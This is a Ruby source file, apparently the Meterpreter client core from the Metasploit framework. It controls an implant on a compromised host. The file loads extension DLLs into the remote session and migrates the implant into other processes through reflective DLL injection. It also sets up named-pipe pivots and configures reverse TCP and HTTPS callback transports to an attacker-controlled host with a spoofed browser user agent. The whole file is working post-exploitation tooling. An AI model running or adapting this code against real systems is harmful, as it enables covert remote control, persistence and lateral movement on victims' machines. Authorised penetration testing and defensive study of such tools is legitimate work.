# -*- coding: binary -*-

require 'rex/post/meterpreter/packet'
require 'rex/post/meterpreter/extension'
require 'rex/post/meterpreter/client'
require 'msf/core/payload/transport_config'

# Used to generate a reflective DLL when migrating. This is yet another
# argument for moving the meterpreter client into the Msf namespace.
require 'msf/core/payload/windows'
require 'msf/core/payload/windows/migrate'
require 'msf/core/payload/windows/x64/migrate'

# URI uuid and checksum stuff
require 'msf/core/payload/uuid'
require 'rex/payloads/meterpreter/uri_checksum'

# certificate hash checking
require 'rex/socket/x509_certificate'

require 'openssl'

module Rex
module Post
module Meterpreter

###
#
# This class is responsible for providing the interface to the core
# client-side meterpreter API which facilitates the loading of extensions
# and the interaction with channels.
#
#
###
class ClientCore < Extension

  METERPRETER_TRANSPORT_TCP   = 0
  METERPRETER_TRANSPORT_HTTP  = 1
  METERPRETER_TRANSPORT_HTTPS = 2

  VALID_TRANSPORTS = {
      'reverse_tcp'   => METERPRETER_TRANSPORT_TCP,
      'reverse_http'  => METERPRETER_TRANSPORT_HTTP,
      'reverse_https' => METERPRETER_TRANSPORT_HTTPS,
      'bind_tcp'      => METERPRETER_TRANSPORT_TCP
  }

  include Rex::Payloads::Meterpreter::UriChecksum

  #
  # Initializes the 'core' portion of the meterpreter client commands.
  #
  def initialize(client)
    super(client, 'core')
  end

  ##
  #
  # Core commands
  #
  ##

  #
  # create a named pipe pivot
  #
  def create_named_pipe_pivot(opts)
    request = Packet.create_request('core_pivot_add')
    request.add_tlv(TLV_TYPE_PIVOT_NAMED_PIPE_NAME, opts[:pipe_name])


    c = Class.new(::Msf::Payload)
    c.include(::Msf::Payload::Stager)
    c.include(::Msf::Payload::TransportConfig)

    # Include the appropriate reflective dll injection module for the target process architecture...
    if opts[:arch] == ARCH_X86
      c.include(::Msf::Payload::Windows::MeterpreterLoader)
    elsif opts[:arch] == ARCH_X64
      c.include(::Msf::Payload::Windows::MeterpreterLoader_x64)
    end

    stage_opts = {
      force_write_handle: true,
      datastore: {
        'PIPEHOST' => opts[:pipe_host],
        'PIPENAME' => opts[:pipe_name]
      }
    }

    stager = c.new()

    stage_opts[:transport_config] = [stager.transport_config_reverse_named_pipe(stage_opts)]
    stage = stager.stage_payload(stage_opts)

    request.add_tlv(TLV_TYPE_PIVOT_STAGE_DATA, stage)
    request.add_tlv(TLV_TYPE_PIVOT_STAGE_DATA_SIZE, stage.length)

    response = self.client.send_request(request)
  end

  #
  # Get a list of loaded commands for the given extension.
  #
  def get_loaded_extension_commands(extension_name)
    request = Packet.create_request('core_enumextcmd')
    request.add_tlv(TLV_TYPE_STRING, extension_name)

    begin
      response = self.client.send_packet_wait_response(request, self.client.response_timeout)
    rescue
      # In the case where orphaned shells call back with OLD copies of the meterpreter
      # binaries, we end up with a case where this fails. So here we just return the
      # empty list of supported commands.
      return []
    end

    # No response?
    if response.nil?
      raise RuntimeError, 'No response was received to the core_enumextcmd request.', caller
    elsif response.result != 0
      # This case happens when the target doesn't support the core_enumextcmd message.
      # If this is the case, then we just want to ignore the error and return an empty
      # list. This will force the caller to load any required modules.
      return []
    end

    commands = []
    response.each(TLV_TYPE_STRING) { |c|
      commands << c.value
    }

    commands
  end

  def transport_list
    request = Packet.create_request('core_transport_list')
    response = client.send_request(request)

    result = {
      :session_exp => response.get_tlv_value(TLV_TYPE_TRANS_SESSION_EXP),
      :transports  => []
    }

    response.each(TLV_TYPE_TRANS_GROUP) { |t|
      result[:transports] << {
        :url            => t.get_tlv_value(TLV_TYPE_TRANS_URL),
        :comm_timeout   => t.get_tlv_value(TLV_TYPE_TRANS_COMM_TIMEOUT),
        :retry_total    => t.get_tlv_value(TLV_TYPE_TRANS_RETRY_TOTAL),
        :retry_wait     => t.get_tlv_value(TLV_TYPE_TRANS_RETRY_WAIT),
        :ua             => t.get_tlv_value(TLV_TYPE_TRANS_UA),
        :proxy_host     => t.get_tlv_value(TLV_TYPE_TRANS_PROXY_HOST),
        :proxy_user     => t.get_tlv_value(TLV_TYPE_TRANS_PROXY_USER),
        :proxy_pass     => t.get_tlv_value(TLV_TYPE_TRANS_PROXY_PASS),
        :cert_hash      => t.get_tlv_value(TLV_TYPE_TRANS_CERT_HASH),
        :custom_headers => t.get_tlv_value(TLV_TYPE_TRANS_HEADERS)
      }
    }

    result
  end

  #
  # Set associated transport timeouts for the currently active transport.
  #
  def set_transport_timeouts(opts={})
    request = Packet.create_request('core_transport_set_timeouts')

    if opts[:session_exp]
      request.add_tlv(TLV_TYPE_TRANS_SESSION_EXP, opts[:session_exp])
    end
    if opts[:comm_timeout]
      request.add_tlv(TLV_TYPE_TRANS_COMM_TIMEOUT, opts[:comm_timeout])
    end
    if opts[:retry_total]
      request.add_tlv(TLV_TYPE_TRANS_RETRY_TOTAL, opts[:retry_total])
    end
    if opts[:retry_wait]
      request.add_tlv(TLV_TYPE_TRANS_RETRY_WAIT, opts[:retry_wait])
    end

    response = client.send_request(request)

    {
      :session_exp  => response.get_tlv_value(TLV_TYPE_TRANS_SESSION_EXP),
      :comm_timeout => response.get_tlv_value(TLV_TYPE_TRANS_COMM_TIMEOUT),
      :retry_total  => response.get_tlv_value(TLV_TYPE_TRANS_RETRY_TOTAL),
      :retry_wait   => response.get_tlv_value(TLV_TYPE_TRANS_RETRY_WAIT)
    }
  end

  #
  # Loads a library on the remote meterpreter instance.  This method
  # supports loading both extension and non-extension libraries and
  # also supports loading libraries from memory or disk depending
  # on the flags that are specified
  #
  # Supported flags:
  #
  #	LibraryFilePath
  #		The path to the library that is to be loaded
  #
  #	LibraryFileImage
  #		Binary object containing the library to be loaded
  #		(can be used instead of LibraryFilePath)
  #
  #	TargetFilePath
  #		The target library path when uploading
  #
  #	UploadLibrary
  #		Indicates whether or not the library should be uploaded
  #
  #	SaveToDisk
  #		Indicates whether or not the library should be saved to disk
  #		on the remote machine
  #
  #	Extension
  #		Indicates whether or not the library is a meterpreter extension
  #
  def load_library(opts)
    library_path = opts['LibraryFilePath']
    library_image = opts['LibraryFileImage']
    target_path  = opts['TargetFilePath']
    load_flags   = LOAD_LIBRARY_FLAG_LOCAL

    # No library path, no cookie.
    if library_path.nil? && library_image.nil?
      raise ArgumentError, 'No library file path or image was supplied', caller
    end

    # Set up the proper loading flags
    if opts['UploadLibrary']
      load_flags &= ~LOAD_LIBRARY_FLAG_LOCAL
    end
    if opts['SaveToDisk']
      load_flags |= LOAD_LIBRARY_FLAG_ON_DISK
    end
    if opts['Extension']
      load_flags |= LOAD_LIBRARY_FLAG_EXTENSION
    end

    # Create a request packet
    request = Packet.create_request('core_loadlib')

    # If we must upload the library, do so now
    if (load_flags & LOAD_LIBRARY_FLAG_LOCAL) != LOAD_LIBRARY_FLAG_LOCAL
      if library_image.nil?
        # Caller did not provide the image, load it from the path
        library_image = ''

        ::File.open(library_path, 'rb') { |f|
          library_image = f.read
        }
      end

      if library_image
        request.add_tlv(TLV_TYPE_DATA, library_image, false, client.capabilities[:zlib])
      else
        raise RuntimeError, "Failed to serialize library #{library_path}.", caller
      end

      # If it's an extension we're dealing with, rename the library
      # path of the local and target so that it gets loaded with a random
      # name
      if opts['Extension']
        if client.binary_suffix and client.binary_suffix.size > 1
          m = /(.*)\.(.*)/.match(library_path)
          suffix = $2
        elsif client.binary_suffix.size == 1
          suffix = client.binary_suffix[0]
        else
          suffix = client.binary_suffix
        end

        library_path = "ext#{rand(1000000)}.#{suffix}"
        target_path  = "/tmp/#{library_path}"
      end
    end

    # Add the base TLVs
    request.add_tlv(TLV_TYPE_LIBRARY_PATH, library_path)
    request.add_tlv(TLV_TYPE_FLAGS, load_flags)

    if !target_path.nil?
      request.add_tlv(TLV_TYPE_TARGET_PATH, target_path)
    end

    # Transmit the request and wait the default timeout seconds for a response
    response = self.client.send_packet_wait_response(request, self.client.response_timeout)

    # No response?
    if response.nil?
      raise RuntimeError, 'No response was received to the core_loadlib request.', caller
    elsif response.result != 0
      raise RuntimeError, "The core_loadlib request failed with result: #{response.result}.", caller
    end

    commands = []
    response.each(TLV_TYPE_METHOD) { |c|
      commands << c.value
    }

    return commands
  end

  #
  # Loads a meterpreter extension on the remote server instance and
  # initializes the client-side extension handlers
  #
  #	Module
  #		The module that should be loaded
  #
  #	LoadFromDisk
  #		Indicates that the library should be loaded from disk, not from
  #		memory on the remote machine
  #
  def use(mod, opts = { })
    if mod.nil?
      raise RuntimeError, "No modules were specified", caller
    end

    modnameprovided = mod
    suffix = nil
    if not client.binary_suffix
      suffix = ''
    elsif client.binary_suffix.size > 1
      client.binary_suffix.each { |s|
        if (mod =~ /(.*)\.#{s}/ )
          mod = $1
          suffix = s
          break
        end
      }
    else
      suffix = client.binary_suffix.first
    end

    # Query the remote instance to see if commands for the extension are
    # already loaded
    commands = get_loaded_extension_commands(mod.downcase)

    # if there are existing commands for the given extension, then we can use
    # what's already there
    unless commands.length > 0
      image = nil
      path = nil
      # If client.sys isn't setup, it's a Windows meterpreter
      if client.respond_to?(:sys) && !client.sys.config.sysinfo['BuildTuple'].blank?
        # Query the payload gem directly for the extension image
        image = MetasploitPayloads::Mettle.load_extension(client.sys.config.sysinfo['BuildTuple'], mod.downcase, suffix)
      else
        # Get us to the installation root and then into data/meterpreter, where
        # the file is expected to be
        modname = "ext_server_#{mod.downcase}"
        path = MetasploitPayloads.meterpreter_path(modname, suffix)

        if opts['ExtensionPath']
          path = ::File.expand_path(opts['ExtensionPath'])
        end
      end

      if path.nil? and image.nil?
        raise RuntimeError, "No module of the name #{modnameprovided} found", caller
      end

      # Load the extension DLL
      commands = load_library(
          'LibraryFilePath' => path,
          'LibraryFileImage' => image,
          'UploadLibrary'   => true,
          'Extension'       => true,
          'SaveToDisk'      => opts['LoadFromDisk'])
    end

    # wire the commands into the client
    client.add_extension(mod, commands)

    return true
  end

  #
  # Set the UUID on the target session.
  #
  def set_uuid(uuid)
    request = Packet.create_request('core_set_uuid')
    request.add_tlv(TLV_TYPE_UUID, uuid.to_raw)

    client.send_request(request)

    true
  end

  #
  # Set the session GUID on the target session.
  #
  def set_session_guid(guid)
    request = Packet.create_request('core_set_session_guid')
    request.add_tlv(TLV_TYPE_SESSION_GUID, guid)

    client.send_request(request)

    true
  end

  #
  # Get the session GUID from the target session.
  #
  def get_session_guid(timeout=nil)
    request = Packet.create_request('core_get_session_guid')

    args = [request]
    args << timeout if timeout

    response = client.send_request(*args)

    response.get_tlv_value(TLV_TYPE_SESSION_GUID)
  end

  #
  # Get the machine ID from the target session.
  #
  def machine_id(timeout=nil)
    request = Packet.create_request('core_machine_id')

    args = [request]
    args << timeout if timeout

    response = client.send_request(*args)

    mid = response.get_tlv_value(TLV_TYPE_MACHINE_ID)

    # Normalise the format of the incoming machine id so that it's consistent
    # regardless of case and leading/trailing spaces. This means that the
    # individual meterpreters don't have to care.

    # Note that the machine ID may be blank or nil and that is OK
    Rex::Text.md5(mid.to_s.downcase.strip)
  end

  #
  # Get the current native arch from the target session.
  #
  def native_arch(timeout=nil)
    # Not all meterpreter implementations support this
    request = Packet.create_request('core_native_arch')

    args = [ request ]
    args << timeout if timeout

    response = client.send_request(*args)

    response.get_tlv_value(TLV_TYPE_STRING)
  end

  #
  # Remove a transport from the session based on the provided options.
  #
  def transport_remove(opts={})
    request = transport_prepare_request('core_transport_remove', opts)

    return false unless request

    client.send_request(request)

    return true
  end

  #
  # Add a transport to the session based on the provided options.
  #
  def transport_add(opts={})
    request = transport_prepare_request('core_transport_add', opts)

    return false unless request

    client.send_request(request)

    return true
  end

  #
  # Change the currently active transport on the session.
  #
  def transport_change(opts={})
    request = transport_prepare_request('core_transport_change', opts)

    return false unless request

    client.send_request(request)

    return true
  end

  #
  # Sleep the current session for the given number of seconds.
  #
  def transport_sleep(seconds)
    return false if seconds == 0

    request = Packet.create_request('core_transport_sleep')

    # we're reusing the comms timeout setting here instead of
    # creating a whole new TLV value
    request.add_tlv(TLV_TYPE_TRANS_COMM_TIMEOUT, seconds)
    client.send_request(request)
    return true
  end

  #
  # Change the active transport to the next one in the transport list.
  #
  def transport_next
    request = Packet.create_request('core_transport_next')
    client.send_request(request)
    return true
  end

  #
  # Change the active transport to the previous one in the transport list.
  #
  def transport_prev
    request = Packet.create_request('core_transport_prev')
    client.send_request(request)
    return true
  end

  #
  # Enable the SSL certificate has verificate
  #
  def enable_ssl_hash_verify
    # Not supported unless we have a socket with SSL enabled
    return nil unless self.client.sock.type? == 'tcp-ssl'

    request = Packet.create_request('core_transport_setcerthash')

    hash = Rex::Text.sha1_raw(self.client.sock.sslctx.cert.to_der)
    request.add_tlv(TLV_TYPE_TRANS_CERT_HASH, hash)

    client.send_request(request)

    return hash
  end

  #
  # Disable the SSL certificate has verificate
  #
  def disable_ssl_hash_verify
    # Not supported unless we have a socket with SSL enabled
    return nil unless self.client.sock.type? == 'tcp-ssl'

    request = Packet.create_request('core_transport_setcerthash')

    # send an empty request to disable it
    client.send_request(request)

    return true
  end

  #
  # Attempt to get the SSL hash being used for verificaton (if any).
  #
  # @return 20-byte sha1 hash currently being used for verification.
  #
  def get_ssl_hash_verify
    # Not supported unless we have a socket with SSL enabled
    return nil unless self.client.sock.type? == 'tcp-ssl'

    request = Packet.create_request('core_transport_getcerthash')
    response = client.send_request(request)

    return response.get_tlv_value(TLV_TYPE_TRANS_CERT_HASH)
  end

  #
  # Migrates the meterpreter instance to the process specified
  # by pid.  The connection to the server remains established.
  #
  def migrate(target_pid, writable_dir = nil, opts = {})
    keepalive              = client.send_keepalives
    client.send_keepalives = false
    target_process         = nil
    current_process        = nil

    # Load in the stdapi extension if not allready present so we can determine the target pid architecture...
    client.core.use('stdapi') if not client.ext.aliases.include?('stdapi')

    current_pid = client.sys.process.getpid

    # Find the current and target process instances
    client.sys.process.processes.each { | p |
      if p['pid'] == target_pid
        target_process = p
      elsif p['pid'] == current_pid
        current_process = p
      end
    }

    # We cant migrate into a process that does not exist.
    unless target_process
      raise RuntimeError, 'Cannot migrate into non existent process', caller
    end

    # We cannot migrate into a process that we are unable to open
    # On linux, arch is empty even if we can access the process
    if client.platform == 'windows'

      if target_process['arch'] == nil || target_process['arch'].empty?
        raise RuntimeError, "Cannot migrate into this process (insufficient privileges)", caller
      end
    end

    # And we also cannot migrate into our own current process...
    if current_process['pid'] == target_process['pid']
      raise RuntimeError, 'Cannot migrate into current process', caller
    end

    migrate_stub = generate_migrate_stub(target_process)
    migrate_payload = generate_migrate_payload(target_process)

    # Build the migration request
    request = Packet.create_request('core_migrate')

    request.add_tlv(TLV_TYPE_MIGRATE_PID, target_pid)
    request.add_tlv(TLV_TYPE_MIGRATE_PAYLOAD_LEN, migrate_payload.length)
    request.add_tlv(TLV_TYPE_MIGRATE_PAYLOAD, migrate_payload, false, client.capabilities[:zlib])
    request.add_tlv(TLV_TYPE_MIGRATE_STUB_LEN, migrate_stub.length)
    request.add_tlv(TLV_TYPE_MIGRATE_STUB, migrate_stub, false, client.capabilities[:zlib])

    if target_process['arch'] == ARCH_X64
      request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 2 ) # PROCESS_ARCH_X64

    else
      request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 1 ) # PROCESS_ARCH_X86
    end

    # if we change architecture, we need to change UUID as well
    if current_process['arch'] != target_process['arch']
      client.payload_uuid.arch = target_process['arch']
      request.add_tlv( TLV_TYPE_UUID, client.payload_uuid.to_raw )
    end

    # Send the migration request. Timeout can be specified by the caller, or set to a min
    # of 60 seconds.
    timeout = [(opts[:timeout] || 0), 60].max
    response = client.send_request(request, timeout)

    # Post-migration the session doesn't have encryption any more.
    # Set the TLV key to nil to make sure that the old key isn't used
    # at all.
    client.tlv_enc_key = nil

    if client.passive_service
      # Sleep for 5 seconds to allow the full handoff, this prevents
      # the original process from stealing our loadlib requests
      ::IO.select(nil, nil, nil, 5.0)
    elsif client.pivot_session.nil?
      # Prevent new commands from being sent while we finish migrating
      client.comm_mutex.synchronize do
        # Disable the socket request monitor
        client.monitor_stop

        ###
        # Now communicating with the new process
        ###

        # only renegotiate SSL if the session had support for it in the
        # first place!
        if client.supports_ssl?
          # If renegotiation takes longer than a minute, it's a pretty
          # good bet that migration failed and the remote side is hung.
          # Since we have the comm_mutex here, we *must* release it to
          # keep from hanging the packet dispatcher thread, which results
          # in blocking the entire process.
          begin
            Timeout.timeout(timeout) do
              # Renegotiate SSL over this socket
              client.swap_sock_ssl_to_plain()
              client.swap_sock_plain_to_ssl()
            end
          rescue TimeoutError
            client.alive = false
            return false
          end
        end

        # Restart the socket monitor
        client.monitor_socket
      end
    end

    # Renegotiate TLV encryption on the migrated session
    secure

    # Load all the extensions that were loaded in the previous instance (using the correct platform/binary_suffix)
    client.ext.aliases.keys.each { |e|
      client.core.use(e)
    }

    # Restore session keep-alives
    client.send_keepalives = keepalive

    return true
  end

  def secure
    client.tlv_enc_key = negotiate_tlv_encryption
  end

  #
  # Shuts the session down
  #
  def shutdown
    request  = Packet.create_request('core_shutdown')

    if client.passive_service
      # If this is a HTTP/HTTPS session we need to wait a few seconds
      # otherwise the session may not receive the command before we
      # kill the handler. This could be improved by the server side
      # sending a reply to shutdown first.
      self.client.send_packet_wait_response(request, 10)
    else
      # If this is a standard TCP session, send and forget.
      self.client.send_packet(request)
    end
    true
  end

  #
  # Indicates if the given transport is a valid transport option.
  #
  def valid_transport?(transport)
    return false if transport.nil?
    VALID_TRANSPORTS.has_key?(transport.downcase)
  end

  #
  # Negotiates the use of encryption at the TLV level
  #
  def negotiate_tlv_encryption
    sym_key = nil
    rsa_key = OpenSSL::PKey::RSA.new(2048)
    rsa_pub_key = rsa_key.public_key

    request  = Packet.create_request('core_negotiate_tlv_encryption')
    request.add_tlv(TLV_TYPE_RSA_PUB_KEY, rsa_pub_key.to_pem)

    begin
      response = client.send_request(request)
      key_enc = response.get_tlv_value(TLV_TYPE_ENC_SYM_KEY)
      key_type = response.get_tlv_value(TLV_TYPE_SYM_KEY_TYPE)

      if key_enc
        sym_key = rsa_key.private_decrypt(key_enc, OpenSSL::PKey::RSA::PKCS1_PADDING)
      else
        sym_key = response.get_tlv_value(TLV_TYPE_SYM_KEY)
      end
    rescue OpenSSL::PKey::RSAError, Rex::Post::Meterpreter::RequestError
      # 1) OpenSSL error may be due to padding issues (or something else)
      # 2) Request error probably means the request isn't supported, so fallback to plain
    end

    {
      key:  sym_key,
      type: key_type
    }
  end

private

  #
  # Get a reference to the currently active transport.
  #
  def get_current_transport
    x = transport_list
    x[:transports][0]
  end

  #
  # Generate a migrate stub that is specific to the current transport type and the
  # target process.
  #
  def generate_migrate_stub(target_process)
    stub = nil


    if client.platform == 'windows' && [ARCH_X86, ARCH_X64].include?(client.arch)
      t = get_current_transport

      c = Class.new(::Msf::Payload)

      if target_process['arch'] == ARCH_X86
        c.include(::Msf::Payload::Windows::BlockApi)
        case t[:url]
        when /^tcp/i
          c.include(::Msf::Payload::Windows::MigrateTcp)
        when /^pipe/i
          c.include(::Msf::Payload::Windows::MigrateNamedPipe)
        when /^http/i
          # Covers HTTP and HTTPS
          c.include(::Msf::Payload::Windows::MigrateHttp)
        end
      else
        c.include(::Msf::Payload::Windows::BlockApi_x64)
        case t[:url]
        when /^tcp/i
          c.include(::Msf::Payload::Windows::MigrateTcp_x64)
        when /^pipe/i
          c.include(::Msf::Payload::Windows::MigrateNamedPipe_x64)
        when /^http/i
          # Covers HTTP and HTTPS
          c.include(::Msf::Payload::Windows::MigrateHttp_x64)
        end
      end

      stub = c.new().generate
    else
      raise RuntimeError, "Unsupported session #{client.session_type}"
    end

    stub
  end

  #
  # Helper function to prepare a transport request that will be sent to the
  # attached session.
  #
  def transport_prepare_request(method, opts={})
    unless valid_transport?(opts[:transport]) && opts[:lport]
      return nil
    end

    if opts[:transport].starts_with?('reverse')
      return false unless opts[:lhost]
    else
      # Bind shouldn't have lhost set
      opts[:lhost] = nil
    end

    transport = opts[:transport].downcase

    request = Packet.create_request(method)

    scheme = transport.split('_')[1]
    url = "#{scheme}://#{opts[:lhost]}:#{opts[:lport]}"

    if opts[:luri] && opts[:luri].length > 0
      if opts[:luri][0] != '/'
        url << '/'
      end
      url << opts[:luri]
      if url[-1] == '/'
        url = url[0...-1]
      end
    end

    if opts[:comm_timeout]
      request.add_tlv(TLV_TYPE_TRANS_COMM_TIMEOUT, opts[:comm_timeout])
    end

    if opts[:session_exp]
      request.add_tlv(TLV_TYPE_TRANS_SESSION_EXP, opts[:session_exp])
    end

    if opts[:retry_total]
      request.add_tlv(TLV_TYPE_TRANS_RETRY_TOTAL, opts[:retry_total])
    end

    if opts[:retry_wait]
      request.add_tlv(TLV_TYPE_TRANS_RETRY_WAIT, opts[:retry_wait])
    end

    # do more magic work for http(s) payloads
    unless transport.ends_with?('tcp')
      if opts[:uri]
        url << '/' unless opts[:uri].start_with?('/')
        url << opts[:uri]
        url << '/' unless opts[:uri].end_with?('/')
      else
        sum = uri_checksum_lookup(:connect)
        url << generate_uri_uuid(sum, opts[:uuid]) + '/'
      end

      # TODO: randomise if not specified?
      opts[:ua] ||= 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'
      request.add_tlv(TLV_TYPE_TRANS_UA, opts[:ua])

      if transport == 'reverse_https' && opts[:cert] # currently only https transport offers ssl
        hash = Rex::Socket::X509Certificate.get_cert_file_hash(opts[:cert])
        request.add_tlv(TLV_TYPE_TRANS_CERT_HASH, hash)
      end

      if opts[:proxy_host] && opts[:proxy_port]
        prefix = 'http://'
        prefix = 'socks=' if opts[:proxy_type].to_s.downcase == 'socks'
        proxy = "#{prefix}#{opts[:proxy_host]}:#{opts[:proxy_port]}"
        request.add_tlv(TLV_TYPE_TRANS_PROXY_HOST, proxy)

        if opts[:proxy_user]
          request.add_tlv(TLV_TYPE_TRANS_PROXY_USER, opts[:proxy_user])
        end
        if opts[:proxy_pass]
          request.add_tlv(TLV_TYPE_TRANS_PROXY_PASS, opts[:proxy_pass])
        end
      end

    end

    request.add_tlv(TLV_TYPE_TRANS_TYPE, VALID_TRANSPORTS[transport])
    request.add_tlv(TLV_TYPE_TRANS_URL, url)

    request
  end

  #
  # Create a full Windows-specific migration payload specific to the target process.
  #
  def generate_migrate_windows_payload(target_process)
    c = Class.new( ::Msf::Payload )
    c.include( ::Msf::Payload::Stager )

    # Include the appropriate reflective dll injection module for the target process architecture...
    if target_process['arch'] == ARCH_X86
      c.include( ::Msf::Payload::Windows::MeterpreterLoader )
    elsif target_process['arch'] == ARCH_X64
      c.include( ::Msf::Payload::Windows::MeterpreterLoader_x64 )
    else
      raise RuntimeError, "Unsupported target architecture '#{target_process['arch']}' for process '#{target_process['name']}'.", caller
    end

    # Create the migrate stager
    migrate_stager = c.new()

    migrate_stager.stage_meterpreter
  end

  #
  # Create a full migration payload specific to the target process.
  #
  def generate_migrate_payload(target_process)
    case client.platform
    when 'windows'
      blob = generate_migrate_windows_payload(target_process)
    else
      raise RuntimeError, "Unsupported platform '#{client.platform}'"
    end

    blob
  end
end

end; end; end

